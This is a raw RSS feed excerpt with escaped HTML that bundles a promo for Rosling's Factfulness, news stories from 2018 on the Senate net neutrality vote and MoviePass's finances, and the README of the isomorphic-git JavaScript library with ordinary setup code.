&lt;p&gt;A new book by the late Hans Rosling and his family, &lt;em&gt;Factfulness&lt;/em&gt; (&lt;a href=&quot;https://amzn.to/2qvmex1&quot;&gt;UK&lt;/a&gt;) (&lt;a href=&quot;https://amzn.to/2GV8iHN&quot;&gt;US&lt;/a&gt;), advocates the merits of understanding the world both through the data and through personal experience — not of news stories or tourist traps, but of the everyday lives being lived all over the world. “Numbers will never tell the full story of what life on Earth is all about,” wrote Rosling, despite being the world’s most famous statistical guru. But the story they do tell matters. In statistics, as elsewhere, hard logic and personal impressions work best when they reinforce and correct each other.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;My book “Messy: How To Be Creative and Resilient in a Tidy-Minded World” is now available in paperback both in the &lt;a href=&quot;http://amzn.to/2Gasthh&quot;&gt;US&lt;/a&gt; and the &lt;a href=&quot;http://amzn.to/2FthX3H&quot;&gt;UK&lt;/a&gt; – or through your local bookshop.&lt;/em&gt;&lt;/p&gt;

<title>Senate votes to reinstate net neutrality</title>
<link>https://www.theverge.com/2018/5/16/17357592/net-neutrality-senate-vote-cra-reinstate-fcc-rules</link>
<guid isPermaLink="true" >https://www.theverge.com/2018/5/16/17357592/net-neutrality-senate-vote-cra-reinstate-fcc-rules</guid>
<description>&lt;p id=&quot;15Fqhn&quot;&gt;The Senate has voted to save net neutrality, but don’t get your hopes up: there’s still a long, likely impossible journey ahead if the policy is to be saved in the immediate future.&lt;/p&gt;
&lt;p id=&quot;U729tV&quot;&gt;In a 52–47 vote today, senators voted to overturn the Federal Communication Commission’s Restoring Internet Freedom Order, which took net neutrality rules off the books. They were able to do so &lt;a href=&quot;https://www.theverge.com/2018/5/3/17314404/net-neutrality-cra-congressional-review-act-markey-senate&quot;&gt;using the Congressional Review Act, or CRA&lt;/a&gt;, which allows Congress to reverse recent decisions by government agencies. Republican control of Congress means that such a measure wouldn’t normally even make it up for a vote; but the CRA allows senators to force a vote by obtaining 30 signatures.&lt;/p&gt;
&lt;p id=&quot;gaB3BR&quot;&gt;All 49 Democrats voted in favor, as well as Republican Senators Susan Collins, of Maine; John Kennedy, of Louisiana; and Lisa Murkowski, of Alaska.&lt;/p&gt;
&lt;div class=&quot;c-float-right&quot;&gt;
&lt;aside id=&quot;vPlfiO&quot;&gt;&lt;q&gt;The House needs a full majority to force a vote; then there’s Trump&lt;/q&gt;&lt;/aside&gt;&lt;/div&gt;
&lt;p id=&quot;nrk6sD&quot;&gt;While advocates have argued that this is a step toward reinstating net neutrality, it’s really a long-shot attempt that seems to be meant more to get the issue back on voters’ minds — and to force politicians to take a position ahead of what’s expected to be a tumultuous midterm election.&lt;/p&gt;
&lt;p id=&quot;XR2gWL&quot;&gt;In order for net neutrality to actually be reinstated, two more things have to happen. First, the House has to use the CRA to overturn the policy as well. That’s even harder. Instead of 30 signatures, net neutrality supporters have to collect signatures from a full majority of House members. Even if they get every single Democrat on board — and they don’t have that yet — they’d still need the support of 22 Republicans. And finally, if that happened and they all voted to reverse the policy, it’d still have to get signed by President Trump, who is not a fan of the policy.&lt;/p&gt;
&lt;p id=&quot;pn0wQd&quot;&gt;While it’s obviously an uphill battle, net neutrality advocates seem to be holding out hope that they could actually get through the House, too. There’s a degree of bipartisan agreement that something needs to be done on net neutrality. And with midterms coming up, representatives in challenging districts may be more inclined to support the popular, consumer-friendly policy. As for Trump, well, you never know exactly how he’s going to wake up each day, or so the argument goes.&lt;/p&gt;
&lt;p id=&quot;cJkDhk&quot;&gt;In reality, this is more about setting up whatever comes next for net neutrality, likely a few years down the line. The general consensus at this point is that net neutrality is now out of the FCC’s hands, and that Congress will have to act to reinstate some of its outgoing rules. It’s not at all clear how soon that’ll happen, but forcing Congress to take a vote helps to clarify the playing field and make sure it’s something legislators are thinking about.&lt;/p&gt;

<title>The Entire Economy Is MoviePass Now</title>
<link>https://www.nytimes.com/2018/05/16/technology/moviepass-economy-startups.html</link>
<guid isPermaLink="true" >https://www.nytimes.com/2018/05/16/technology/moviepass-economy-startups.html</guid>
<description>&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;Perhaps the buzziest money-loser of the year is MoviePass, which has upended the film industry by essentially giving away millions of free movie tickets. Until recently, MoviePass members could pay $9.95 for a monthly subscription that allowed them to watch up to one movie per day in theaters, with MoviePass paying the face value of the ticket on a preloaded debit card. Since the average cost of a movie ticket in the United States is around $9, going to just two movies per month resulted in a good deal for the customer, and a loss for the company. (MoviePass has started &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.theverge.com/2018/4/27/17291242/moviepass-unlimited-movie-deal-repeat-viewings-theater-blackouts&quot; title=&quot;&quot; target=&quot;_blank&quot;&gt;placing more restrictions&lt;/a&gt; on which films its customers can see, perhaps in an effort to trim costs.)&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;MoviePass’s business model — which &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://slate.com/business/2018/05/moviepass-appears-to-be-running-very-low-on-money.html&quot; title=&quot;&quot; target=&quot;_blank&quot;&gt;Slate described&lt;/a&gt; as “creatively lighting money aflame in order to subsidize the movie-going habits of some 3 million customers” — has turbocharged its growth. And the company maintains that it can make money by striking revenue-sharing deals with theater chains, or charging movie studios to advertise inside its app.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;But investors aren’t convinced. Shares of MoviePass’s parent company, Helios and Matheson Analytics, have fallen more than 90 percent since October, and the company recently reported that it has been burning through its cash reserves, spending an average of $21.7 million per month with just $15.5 million left in the bank at the end of April. On Tuesday, Helios reported that MoviePass lost $98.3 million in the first quarter, despite adding more than a million net subscribers.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;Mitch Lowe, the chief executive of MoviePass, told me in a phone interview this week that the company’s financial troubles have been exaggerated. The company has access to a $300 million equity line of credit that will keep it solvent, he said, and blamed the company’s competitors, such as large theater chains, for sowing the seeds of doubt.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;“They smell blood in the water, so they’re spreading rumors and hypotheses,” he said.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;Ultimately, companies like MoviePass illustrate the perilous tightrope many growing businesses must walk. Spend too little on acquiring new customers and drawing business away from your competitors, and you won’t make it off the ground. Give too many freebies away, and you risk running out of cash before you’re big enough to cash in.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;“Pricing can be strategic,” said Kara Nortman, a partner at Upfront Ventures, which invests in technology companies. “If you can attract a lot of consumers to your product or service, it gives you a lot more power with incumbents who are limiting your growth.”&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;The king of money-losers, of course, is Amazon, which went years without turning a profit. Instead, it plowed billions of dollars back into its business, building out its e-commerce infrastructure and jump-starting side efforts like Amazon Web Services and Amazon Prime Video. Those years of investments paid off, and Amazon is now the second most valuable company in the world, with $1.6 billion in profit last quarter alone.&lt;/p&gt;
&lt;p class=&quot;css-1cy1v93 e2kc3sl0&quot;&gt;Not every company can repeat Amazon’s success. Just ask any of the dozens of “Uber for X” start-ups that raised millions of dollars to disrupt industries like laundry, parking and grocery delivery by offering cut-rate promotional deals, only to &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://www.nytimes.com/2016/03/24/technology/the-uber-model-it-turns-out-doesnt-translate.html&quot; title=&quot;&quot; target=&quot;_blank&quot;&gt;run out of capital&lt;/a&gt; before customers latched on. Or consider crash-and-burn cases like Beepi, a used car marketplace that blew through nearly $150 million in venture capital before &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://techcrunch.com/2016/12/07/used-car-marketplace-beepi-shuts-down-outside-of-ca-merges-with-stealth-fair-com/&quot; title=&quot;&quot; target=&quot;_blank&quot;&gt;shutting down in 2016&lt;/a&gt;. (Happily, not before &lt;a class=&quot;css-1g7m0tk&quot; href=&quot;https://splinternews.com/i-bought-a-car-from-the-uber-for-used-cars-start-up-1793845289&quot; title=&quot;&quot; target=&quot;_blank&quot;&gt;I bought a car through the service&lt;/a&gt; for thousands of dollars less than its market value. Thanks, venture capitalists!)&lt;/p&gt;

<title>A pure JavaScript implementation of Git for Node and browsers</title>
<link>https://github.com/isomorphic-git/isomorphic-git</link>
<guid isPermaLink="true" >https://github.com/isomorphic-git/isomorphic-git</guid>
<description>&lt;h3&gt;README.md&lt;/h3&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;
&lt;p&gt;A pure JavaScript implementation of git for node and browsers!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;isomorphic-git&lt;/code&gt; is a pure JavaScript implementation of git that works in node and browser environments (including WebWorkers and ServiceWorkers). This means it can be used to read and write to to git repositories, as well as fetch from and push to git remotes like Github.&lt;/p&gt;
&lt;p&gt;Isomorphic-git aims for 100% interoperability with the canonical git implementation. This means it does all its operations by modifying files in a &quot;.git&quot; directory just like the git you are used to. The included &lt;code&gt;isogit&lt;/code&gt; CLI can operate on git repositories on your desktop or server.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;isomorphic-git&lt;/code&gt; aims to be a complete solution with no assembly required. I've tried carefully to design the API so it is easy to use all the features, without paying a penalty in bundle size. By providing functionality as separate functions instead of an object oriented API, code bundlers like Webpack will only include the functionality your application actually uses. (Or at least that's the goal.)&lt;/p&gt;
&lt;p&gt;I am working on adding type definitions so you can enjoy static type-checking and intelligent code completion in editors like &lt;a href=&quot;https://codesandbox.io&quot; rel=&quot;nofollow&quot;&gt;CodeSandbox&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Getting Started&lt;/h2&gt;
&lt;p&gt;The &quot;isomorphic&quot; in &lt;code&gt;isomorphic-git&lt;/code&gt; means it works equally well on the server or the browser. That's tricky to do since git uses the file system, and browsers don't have an &lt;code&gt;fs&lt;/code&gt; module. So rather than relying on the &lt;code&gt;fs&lt;/code&gt; module, &lt;code&gt;isomorphic-git&lt;/code&gt; is BYOFS (Bring Your Own File System). When creating a new Git object, you pass it the &lt;code&gt;fs&lt;/code&gt; module to use.&lt;/p&gt;
&lt;p&gt;If you're only using &lt;code&gt;isomorphic-git&lt;/code&gt; in Node, you can just use the native &lt;code&gt;fs&lt;/code&gt; module.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;isomorphic-git&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;fs&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;fs&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
&lt;span class=&quot;pl-smi&quot;&gt;git&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;listFiles&lt;/span&gt;({fs, dir&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;__dirname&lt;/span&gt;});
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you're writing code for the browser though, you'll need something that emulates the &lt;code&gt;fs&lt;/code&gt; API. At the time of writing, the most complete option is &lt;a href=&quot;https://github.com/jvilk/BrowserFS&quot;&gt;BrowserFS&lt;/a&gt;. It has a few more steps involved to set up than in Node, as seen below:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-text-html-basic&quot;&gt;
&lt;pre&gt;
&amp;lt;&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;pl-e&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;https://unpkg.com/browserfs&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;pl-e&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;https://unpkg.com/isomorphic-git&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt;&amp;gt;
&lt;span class=&quot;pl-s1&quot;&gt;&lt;span class=&quot;pl-smi&quot;&gt;BrowserFS&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;configure&lt;/span&gt;({ fs&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;IndexedDB&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, options&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; {} }, &lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; (&lt;span class=&quot;pl-smi&quot;&gt;err&lt;/span&gt;) {&lt;/span&gt;
&lt;span class=&quot;pl-s1&quot;&gt;  &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (err) &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(err);&lt;/span&gt;
&lt;span class=&quot;pl-s1&quot;&gt;  &lt;span class=&quot;pl-c1&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fs&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;BrowserFS&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;BFSRequire&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;fs&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;);&lt;/span&gt;
&lt;span class=&quot;pl-s1&quot;&gt;  &lt;span class=&quot;pl-smi&quot;&gt;git&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;listFiles&lt;/span&gt;({fs&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;fs&lt;/span&gt;, dir&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;/&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;});&lt;/span&gt;
&lt;span class=&quot;pl-s1&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;pl-s1&quot;&gt;&amp;lt;&lt;/span&gt;/&lt;span class=&quot;pl-ent&quot;&gt;script&lt;/span&gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Besides IndexedDB, BrowserFS supports many different backends with different performance characteristics, as well as advanced configurations such as: multiple mounting points, and overlaying a writeable filesystems on top of a read-only filesystem. You don't need to know about all these features, but familiarizing yourself with the different options may be necessary if you hit a storage limit or performance bottleneck in the IndexedDB backend I suggested above.&lt;/p&gt;
&lt;p&gt;View the full Getting Started guide &lt;a href=&quot;https://isomorphic-git.github.io/docs/quickstart.html&quot; rel=&quot;nofollow&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;CORS support&lt;/h3&gt;
&lt;p&gt;Unfortunately, due to the same-origin policy by default &lt;code&gt;isomorphic-git&lt;/code&gt; can only clone from the same origin as the webpage it is running on. This is terribly inconvenient, as it means for all practical purposes cloning and pushing repos must be done through a &lt;a href=&quot;https://cors-buster-jfpactjnem.now.sh/&quot; rel=&quot;nofollow&quot;&gt;proxy&lt;/a&gt;. However, I am &quot;being the change you want to see in the world&quot; by making PRs to all the major git repository hosting services.&lt;/p&gt;
&lt;p&gt;It is literally just two lines of code to add the CORS headers!! Easy stuff. Surely it will happen.&lt;/p&gt;
&lt;h3&gt;Using as an npm module&lt;/h3&gt;
&lt;p&gt;You can install it from npm.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;npm install --save isomorphic-git
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;In the package.json you'll see there are actually 4 different versions:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-json&quot;&gt;
&lt;pre&gt;
  &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;main&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;dist/for-node/&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;,
  &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;browser&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;dist/for-browserify/&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;,
  &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;module&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;dist/for-future/&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;,
  &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;unpkg&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;: &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;dist/bundle.umd.min.js&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;,
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This probably deserves a brief explanation.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;the &quot;main&quot; version is for node.&lt;/li&gt;
&lt;li&gt;the &quot;browser&quot; version is for browserify.&lt;/li&gt;
&lt;li&gt;the &quot;module&quot; version is for native ES6 module loaders when they arrive.&lt;/li&gt;
&lt;li&gt;the &quot;unpkg&quot; version is the UMD build.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;For more details about each build see &lt;a href=&quot;https://github.com/isomorphic-git/isomorphic-git/blob/master/dist/README.md&quot;&gt;./dist/README.md&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;code&gt;isogit&lt;/code&gt; CLI&lt;/h3&gt;
&lt;p&gt;Isomorphic-git comes with a simple CLI tool, named &lt;code&gt;isogit&lt;/code&gt; because &lt;code&gt;isomorphic-git&lt;/code&gt; is a lot to type. It is really just a thin shell that translates command line arguments into the equivalent JS API commands. So you should be able to run &lt;em&gt;any&lt;/em&gt; current or future isomorphic-git commands using the CLI.&lt;/p&gt;
&lt;p&gt;It always starts with an the assumption that the current working directory is a git root. E.g. &lt;code&gt;repo = new Git({fs, dir: '.'})&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It uses &lt;code&gt;minimisted&lt;/code&gt; to parse command line options.&lt;/p&gt;
&lt;p&gt;TODO: Document this more. Also write some tests? IDK the CLI is more of a lark for testing really.&lt;/p&gt;
&lt;h2&gt;Supported Git commands&lt;/h2&gt;
&lt;p&gt;I may continue to make changes to the API until the 1.0 release, after which I promise not to make any breaking changes.&lt;/p&gt;
&lt;h3&gt;commands&lt;/h3&gt;
&lt;h3&gt;utils&lt;/h3&gt;
&lt;h2&gt;Internal code architecture&lt;/h2&gt;
&lt;p&gt;I have written this library as a series of layers that build upon one another and should tree-shake very well:&lt;/p&gt;
&lt;h3&gt;Commands&lt;/h3&gt;
&lt;p&gt;Each command is available as its own file, so you are able to import individual commands if you only need a few in order to optimize your bundle size.&lt;/p&gt;
&lt;h3&gt;Managers&lt;/h3&gt;
&lt;p&gt;Managers are a level above models. They take care of implementation performance details like&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;batching reads to and from the file system&lt;/li&gt;
&lt;li&gt;in-process concurrency locks&lt;/li&gt;
&lt;li&gt;lockfiles&lt;/li&gt;
&lt;li&gt;caching files and invalidating cached results&lt;/li&gt;
&lt;li&gt;reusing objects&lt;/li&gt;
&lt;li&gt;object memory pools&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;Models and Utils&lt;/h3&gt;
&lt;p&gt;Models and utils are the lowest level building blocks. Models generally have very few or no dependencies except for &lt;code&gt;'buffer'&lt;/code&gt;. This makes them portable to many different environments so they can be a useful lowest common denominator.&lt;/p&gt;
&lt;p&gt;Utils are basically miscellaneous functions. Some are convenience wrappers for common filesystem operations.&lt;/p&gt;

&lt;h2&gt;Acknowledgments&lt;/h2&gt;
&lt;p&gt;Isomorphic-git would not have been possible without the pioneering work by @creationix and @chrisdickinson. Git is a tricky binary mess, and without their examples (and their modules!) I would not have been able to come even close to finishing this. They are geniuses ahead of their time.&lt;/p&gt;
